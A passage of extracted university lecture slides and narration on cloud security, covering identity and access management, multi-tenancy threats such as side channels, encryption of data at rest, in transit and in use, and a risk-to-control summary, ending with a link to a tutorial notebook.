## Original source — PDF page 68

(inside = trusted, 
outside = untrusted)

(authenticated =

trusted, 
unauthenticated =

blocked)

Identity is the foundation of cloud security. If attackers steal credentials, they bypass all your other defenses. Protect

credentials with MFA, rotate keys regularly, use the principle of least privilege.

Identity and access management

In traditional security, the perimeter was the network—firewalls, VPNs, IDS at the network edge protected internal 
resources. If you were on the internal network, you were trusted. If you were outside, you were blocked. This 
model collapses in the cloud. There's no single network perimeter—your resources are distributed across regions, 
accessible from anywhere, shared with other tenants. The new perimeter is IDENTITY: If you can authenticate as a 
legitimate user (prove who you are), you're granted access. If not, you're blocked, regardless of network location. This 
is the philosophy of Zero Trust: "Never trust, always verify." Every request is authenticated and authorized, even from 
internal networks.

IAM (Identity and Access Management) is the framework for managing identity in the cloud. Three core functions: (1) 
Provisioning—Rapidly granting and revoking access. When a new doctor joins the hospital, create their cloud account, 
assign roles (can read patient data, can't modify), and provision access to resources (EHR database, analytics tools). 
When a doctor leaves, immediately revoke access (offboarding). In the cloud, provisioning is automated via APIs—no 
manual server configurations. (2) Authentication—Verifying the user is who they claim to be. MFA (Multi-Factor 
Authentication) is MANDATORY (highlighted on slide). Username/password alone is insufficient—attackers steal

## Original source — PDF page 69

credentials via phishing. With MFA, even if the attacker has the password, they can't log in without the second factor (phone, 
hardware token, biometric). (3) Authorization—Controlling access levels via policy. Just because a user is authenticated 
doesn't mean they can access everything. A nurse can read patient records for her department but can't delete the database 
or access financial data. Authorization uses Role-Based Access Control (RBAC): Assign users to roles (Doctor, Nurse, Admin), 
and assign permissions to roles.

The diagram shows: Old Perimeter = Network (inside = trusted, outside = untrusted). New Perimeter = Identity (authenticated 
= trusted, unauthenticated = blocked). This shift is critical for remote work, cloud, mobile devices. A doctor accessing the EHR
from a coffee shop WiFi is authenticated (MFA) and authorized (RBAC), so they're granted access, even though they're on an 
untrusted network. An attacker on the same coffee shop WiFi can't access the EHR because they're not authenticated.

Identity is the foundation of cloud security. If attackers steal credentials, they bypass all your other defenses. Protect 
credentials with MFA, rotate keys regularly, use the principle of least privilege.

## Original source — PDF page 70

37
Multi-tenancy is a fundamental cloud trade-off: Cost and scalability vs. isolation. For highly sensitive workloads (genetic data,

financial transactions), consider dedicated instances or private cloud.

Multi-tenancy is when multiple customers (tenants) share the same physical infrastructure (servers, storage, 
networks). This is how cloud providers achieve economies of scale—instead of dedicating hardware to each customer, 
they pack many customers onto the same servers. For example, a single AWS server might host virtual machines for a 
hospital, a bank, an e-commerce site, and a gaming company. From each tenant's perspective, they have a dedicated 
VM. But physically, they're all running on the same hardware, sharing CPU caches, memory buses, and GPUs. This 
creates The Neighbor Problem: Can one tenant attack another by exploiting shared hardware?

Three threats: (1) Shared Technology Issues—VMs are isolated by hypervisors (a program used to run and manage 
one or more virtual machines on a computer such as VMware, Xen, KVM), but hypervisor vulnerabilities exist. If an 
attacker exploits a hypervisor bug, they can "break out" of their VM and access the host system (and other VMs on 
that host). Example: The Cloudbleed bug (2017) in Cloudflare's infrastructure caused memory leaks that exposed data 
from unrelated customers. Hypervisor bugs are rare but catastrophic. (2) Side-Channel Attacks—Extracting 
information via shared hardware characteristics. Example: Spectre and Meltdown (2018)—CPU vulnerabilities that 
allowed attackers to read memory from other processes on the same CPU (including other tenants' VMs). Attackers

## Original source — PDF page 71

could time CPU cache hits/misses to infer encryption keys or passwords from neighboring VMs. Another example: GPU side-
channels—inferring machine learning model weights by observing GPU execution times. (3) The Noisy Neighbor—Resource 
monopolization causing Denial of Service. If one tenant runs a CPU-intensive workload (bitcoin mining, machine learning 
training), they can starve other tenants on the same server of CPU cycles, causing performance degradation. Cloud providers 
use resource limits (CPU quotas, I/O throttling) to mitigate this, but it's imperfect.

Defense: (1) Dedicated instances (AWS offers "dedicated hosts" where you're the only tenant on a physical server—expensive 
but eliminates noisy neighbor), (2) Encryption (even if an attacker reads memory, they see ciphertext), (3) Regular 
patching (providers patch hypervisors and CPUs against known side-channels).

Multi-tenancy is a fundamental cloud trade-off: Cost and scalability vs. isolation. For highly sensitive workloads (genetic 
data, financial transactions), consider dedicated instances or private cloud.

## Original source — PDF page 72

Threat: Sniffing (network eavesdropping), man-in-the-
middle attacks. 
Protection: TLS/SSL (encrypt all network connections) 
and strong API access control (authenticate every 
request). All communication between cloud services 
should use HTTPS. Internal microservice 
communication should also use TLS (don't assume 
internal networks are safe).

Threat: Physical theft of disks, insider access, 
misconfigured permissions. 
Protection: Encryption with client-managed 
keys. Encrypt data before storing it in the 
cloud, and keep the encryption keys yourself 
(not with the provider). This way, even if the 
provider's staff or an attacker accesses the 
disks, they see only ciphertext. The provider 
can't decrypt your data without your keys.

Threat: Memory dumps, side-channel attacks, insider access to running processes. Protection: DLP (Data Loss 
Prevention) and tagging for logical separation. DLP tools monitor data flows and block unauthorized exfiltration 
(e.g., prevent copying patient records to personal email). Tagging separates data by sensitivity: Tag patient genetic 
data as "Confidential" and enforce policies (only specific roles can access, never log to disk, encrypt in memory). 
Encrypt data in all three states. Encryption at rest and in transit are standard; encryption in use is emerging but

important for highly sensitive workloads.

Data in the cloud exists in three states, each requiring different protection strategies: (1) Data at Rest—Data stored on 
disks (databases, file storage, backups). Threat: Physical theft of disks, insider access, misconfigured permissions. 
Protection: Encryption with client-managed keys. Encrypt data before storing it in the cloud, and keep the encryption 
keys yourself (not with the provider). This way, even if the provider's staff or an attacker accesses the disks, they see 
only ciphertext. The provider can't decrypt your data without your keys. Tools: AWS KMS (Key Management Service) 
with customer-managed keys, Azure Key Vault, Google Cloud KMS. A hospital example: Encrypt patient records with 
keys stored on-premises. Store encrypted records in AWS S3. AWS employees can't read the records without the keys.

(2) Data in Transit—Data moving over networks (between user and cloud, between cloud services, between regions). 
Threat: Sniffing (network eavesdropping), man-in-the-middle attacks. Protection: TLS/SSL (encrypt all network 
connections) and strong API access control (authenticate every request). All communication between cloud services 
should use HTTPS. Internal microservice communication should also use TLS (don't assume internal networks are 
safe). Example: A doctor accesses the patient portal over HTTPS. The portal queries the database over a TLS-
encrypted connection. Even if an attacker sniffs network traffic, they see encrypted gibberish.

## Original source — PDF page 73

(3) Data in Use—Data being processed (in memory, CPU). Threat: Memory dumps, side-channel attacks, insider access to 
running processes. Protection: DLP (Data Loss Prevention) and tagging for logical separation. DLP tools monitor data flows 
and block unauthorized exfiltration (e.g., prevent copying patient records to personal email). Tagging separates data by 
sensitivity: Tag patient genetic data as "Confidential" and enforce policies (only specific roles can access, never log to disk,
encrypt in memory). Emerging technology: Confidential computing (Intel SGX, AMD SEV)—encrypt data in CPU memory so 
even the hypervisor can't read it. This is cutting-edge but addresses the "data in use" problem.

Encrypt data in all three states. Encryption at rest and in transit are standard; encryption in use is emerging but important
for highly sensitive workloads.

## Original source — PDF page 74

39
Cloud security is about balancing risk and benefit. The cloud offers immense advantages (scale, cost, agility), but you must 
architect security from day one. Follow the Shared Responsibility Model, lock down IAM, encrypt data, monitor continuously.

Let's conclude Part C with a summary table that maps Risks (Threats) to Controls (Mitigation). (1) Shared 
Responsibility: Liability remains yours. Even though the provider secures infrastructure, YOU secure your use of it. If 
there's a breach due to misconfiguration, YOU face fines, lawsuits, reputational damage. Control: Governance—Know 
the model (IaaS/PaaS/SaaS) and your responsibilities. Document who's responsible for what. Train staff on cloud 
security best practices. Regularly review configurations.

(2) Misconfiguration: The silent killer. 95% of cloud breaches involve customer misconfiguration (public S3 buckets, 
overly permissive firewall rules, disabled logging). Control: Identity (IAM)—IAM is the new firewall. Use strong 
authentication (MFA mandatory), authorization (RBAC, least privilege), and regular access reviews (revoke unused 
accounts). Infrastructure as Code (IaC)—Define infrastructure in code (Terraform, CloudFormation) with security built 
in. Automated security scanning (Checkov, Prowler) catches misconfigurations before deployment.

(3) Insiders: Malicious and Negligent. Malicious insiders abuse privileges; negligent insiders make mistakes (phishing, 
misconfigurations). Control: Encryption—Encrypt data at rest (client-managed keys), in transit (TLS everywhere), and

## Original source — PDF page 75

in use (confidential computing if applicable). Logging and SIEM—Monitor admin actions, detect anomalies (unusual access 
patterns, privilege escalations), generate alerts. Separation of duties—No single person has full access. Require multiple 
approvals for critical actions (deleting backups, exporting data).

(4) Multi-tenancy: The neighbor problem. Shared infrastructure means risk of side-channels, hypervisor vulnerabilities, noisy 
neighbors. Control: Audit—Logging and SIEM visibility into all cloud activity. Review provider's security reports (SOC 2, ISO 
27001). For ultra-sensitive workloads, use dedicated instances or private cloud.

Cloud security is about balancing risk and benefit. The cloud offers immense advantages (scale, cost, agility), but you must 
architect security from day one. Follow the Shared Responsibility Model, lock down IAM, encrypt data, monitor 
continuously.

## Original source — PDF page 76

[No extractable narration; see source image.]

## Original source — PDF page 77

Tutorial 4 - Web, 
Network & Cloud

Security (Case

Studies)

https://colab.research.google.com/drive/1yBj6ge

daax7YO463awu-_azaT-wPcR2M?usp=sharing

